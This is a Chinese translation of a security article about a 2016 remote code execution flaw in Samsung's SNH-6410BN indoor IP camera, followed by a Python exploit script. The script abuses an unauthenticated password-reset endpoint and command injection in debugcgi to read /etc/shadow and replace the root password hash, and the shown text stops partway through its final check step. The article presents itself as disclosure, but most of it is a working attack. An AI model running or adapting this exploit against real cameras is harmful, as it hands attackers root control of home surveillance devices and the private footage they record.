# 三星智能监控摄像头被爆远程代码执行漏洞（含POC）
|
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
**漏洞概况**
EDB-ID:40235
漏洞发现者：PentestPartners
CVE：暂无
发布日期：2016年08月14日
漏洞类型：远程漏洞
受影响平台：系统硬件
受影响App：暂无
漏洞利用POC：[点击下载](https://www.exploit-db.com/download/40235)
**前言**
目前，绝大多数安全研究专家在对物联网设备进行漏洞研究时，都将研究重点集中在了如何利用这些漏洞来展开网络攻击。很少有人知道如何去修复这些安全问题，而且也几乎没人关心如何才能防止这些设备继续遭受攻击。为此，我们专门对一款IP监控摄像头进行了分析，并发现了很多小问题。而将这些安全问题联系在一起，我们就能够获取到目标设备的root访问权限了。虽说它们都是一些小问题，但是修复起来却非常的困难。所以我们认为应该专门写一篇关于如何发现并修复物联网设备漏洞的文章。
我们的研究对象是三星的一款室内IP监控摄像头－[SNH-6410BN](https://www.amazon.co.uk/dp/B00MQS0FZY/ref=pd_lpo_sbs_dp_ss_1?pf_rd_p=569136327&pf_rd_s=lpo-top-stripe&pf_rd_t=201&pf_rd_i=B00J38NVHE&pf_rd_m=A3P5ROKL5A1OLE&pf_rd_r=2AXRQSAPF7Z6CTHDX0FE)。如果单纯从质量和功能性的角度来考察，那么这款摄像头没有任何的问题，因为它的拍摄清晰度非常高，而且三星还为其配备了非常优秀的应用软件。但是，它是一款IP摄像头，所以网络安全的问题就成为了它的一块短版。
通常情况下，用户会使用移动端应用程序或者网站提供的“云服务”来远程访问摄像头。但是这款摄像头使用的仍是SSH，而且还有专门与之对应的Web服务器。这就是我们测试的切入点。因为Web服务器只支持HTTP协议，而不支持使用HTTPS协议。
**  
**
**漏洞利用代码**
    # E-DB Note: source ~ https://www.pentestpartners.com/blog/samsungs-smart-camera-a-tale-of-iot-network-security/
    import urllib, urllib2, crypt, time
    # New password for web interface
    web_password       = 'admin'
    # New password for root
    root_password  = 'root'
    # IP of the camera
    ip           = '192.168.12.61'
    # These are all for the Smartthings bundled camera
    realm = 'iPolis'
    web_username = 'admin'
    base_url = 'http://' + ip + '/cgi-bin/adv/debugcgi?msubmenu=shell&command=ls&command_arg=/...;'
    # Take a command and use command injection to run it on the device
    def run_command(command):
           # Convert a normal command into one using bash brace expansion
           # Can't send spaces to debugcgi as it doesn't unescape
           command_brace = '{' + ','.join(command.split(' ')) + '}'
           command_url = base_url + command_brace
           # HTTP digest auth for urllib2
           authhandler = urllib2.HTTPDigestAuthHandler()
           authhandler.add_password(realm, command_url, web_username, web_password)
           opener = urllib2.build_opener(authhandler)
           urllib2.install_opener(opener)
           return urllib2.urlopen(command_url)
    # Step 1 - change the web password using the unauthed vuln found by zenofex
    data = urllib.urlencode({ 'data' : 'NEW;' + web_password })
    urllib2.urlopen('http://' + ip + '/classes/class_admin_privatekey.php', data)
    # Need to sleep or the password isn't changed
    time.sleep(1)
    # Step 2 - find the current root password hash
    shadow = run_command('cat /etc/shadow')
    for line in shadow:
           if line.startswith('root:'):
                  current_hash = line.split(':')[1]
    # Crypt the new password
    new_hash = crypt.crypt(root_password, '00')
    # Step 3 - Use sed to search and replace the old for new hash in the passwd
    # This is done because the command injection doesn't allow a lot of different URL encoded chars
    run_command('sed -i -e s/' + current_hash + '/' + new_hash + '/g /etc/shadow')
    # Step 4 - check that the password has changed
    shadow = run_command('cat /etc/shadow')
    for line in shadow: